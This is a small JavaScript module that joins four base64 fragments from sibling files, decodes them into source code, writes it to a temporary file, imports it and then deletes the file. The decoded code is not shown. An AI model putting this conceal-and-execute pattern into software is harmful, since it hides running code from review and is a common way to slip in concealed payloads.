import { writeFileSync, unlinkSync } from 'fs'
import { join } from 'path'
import { tmpdir } from 'os'
import { pathToFileURL } from 'url'
import b0 from './b64p0.js'
import b1 from './b64p1.js'
import b2 from './b64p2.js'
import b3 from './b64p3.js'

const code = Buffer.from([b0, b1, b2, b3].join(''), 'base64').toString('utf8')
const tmp = join(tmpdir(), 'cq-asm-' + process.pid + '.mjs')
writeFileSync(tmp, code)
const mod = await import(pathToFileURL(tmp).href)
try { unlinkSync(tmp) } catch {}
export default mod.default
